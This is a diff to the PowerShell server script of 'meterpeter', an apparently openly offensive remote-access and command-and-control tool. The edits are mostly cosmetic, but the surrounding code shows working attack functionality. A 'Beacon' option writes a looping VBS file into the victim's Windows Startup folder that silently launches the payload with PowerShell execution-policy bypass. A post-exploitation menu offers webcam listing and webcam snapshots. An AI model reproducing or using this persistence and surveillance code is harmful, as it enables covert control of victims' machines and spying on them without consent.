@@ -390,15 +390,17 @@ While($Client.Connected)
     {
       $Parse = "$IPATH"+"meterpeter.ps1"
       $SerSat = "$Local_Host"+":"+"$Local_Port";
+      $NetInter = Get-NetIPConfiguration|findstr /C:"InterfaceDescription";$Report = $NetInter[0];
       write-host "`n`n Server Settings" -ForegroundColor green;
       write-host " ---------------";
-      write-host " meterpeter dev        : $dev_Version";
-      write-host " Local Architecture    : $env:PROCESSOR_ARCHITECTURE";
-      write-host " Obfuscation Sellected : $ob";
-      write-host " Attacker OS flavor    : $Flavor Distro";
-      write-host " Lhost|Lport Settings  : $SerSat";
-      write-host " meterpeter WebServer  : $APACHE";
-      write-host " meterpeter Server     : $Parse";
+      write-host " meterpeter dev       : $dev_Version";
+      write-host " Local Architecture   : $env:PROCESSOR_ARCHITECTURE";
+      write-host " Obfuscation Settings : $ob";
+      write-host " Attacker OS flavor   : $Flavor Distro";
+      write-host " Lhost|Lport Settings : $SerSat";
+      write-host " meterpeter WebServer : $APACHE";
+      write-host " meterpeter Server    : $Parse";
+      write-host " $Report";
     }
 
     ## venom v1.0.16 function
@@ -918,7 +920,9 @@ While($Client.Connected)
         $startup_choise = Read-Host;
         If($startup_choise -eq "Beacon" -or $startup_choise -eq "Beacon")
         {
+          $dat = Get-Date;
           $BeaconTime = $Null;
+          $logfile = "$IPATH"+"beacon.log";
           Write-host " - Input Time (sec) to beacon home (eg: 60): " -NoNewline;
           $Delay_Time = Read-Host;
           If(-not($Delay_Time) -or $Delay_Time -lt "30"){$Delay_Time = "60"}
@@ -928,12 +932,11 @@ While($Client.Connected)
           Write-Host "   -------               -----------";
           Write-Host "   $payload_name.ps1  `$env:tmp\$payload_name.ps1";
           Write-Host "   $payload_name.vbs  `$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs";
+          Write-Host "   Persistence LogFile: $logfile (Locally)" -ForeGroundColor yellow;
           Write-Host "   On StartUp our Client will beacon home from $Delay_Time to $Delay_Time seconds (loop)." -ForeGroundColor yellow;
           $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Do' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'wscript.sleep $BeaconTime' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"cmd.exe /R powershell.exe -Exec Bypass -Win 1 -File %tmp%\$payload_name.ps1`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Loop' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo `"   [i] Client $Payload_name.ps1 successful Persisted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";          
           #$Command = Variable_Obfuscation(Character_Obfuscation($Command));
           ## Writing persistence setting into beacon.log local file ..
-          $dat = Get-Date;
-          $logfile = "$IPATH"+"beacon.log";
           echo "" >> $logfile;echo "Persistence Settings" >> $logfile;
           echo "--------------------" >> $logfile;echo "DATE  : $dat" >> $logfile;
           echo "RHOST : $Remote_Host" >> $logfile;echo "LHOST : $Local_Host" >> $logfile;
@@ -1001,7 +1004,7 @@ While($Client.Connected)
         write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
         write-host "   -------   -----------                     ------";
         write-host "   Device    List WebCam Devices             Client:User  -  Privileges required";
-        write-host "   Snap      Take WebCam Screenshot          Client:User:Admin  - Privs required";
+        write-host "   Snap      Take WebCam Screenshot          Client:User|Admin  - Privs required";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Post:Cam> " -NoNewline -ForeGroundColor Green;
         $Cam_choise = Read-Host;
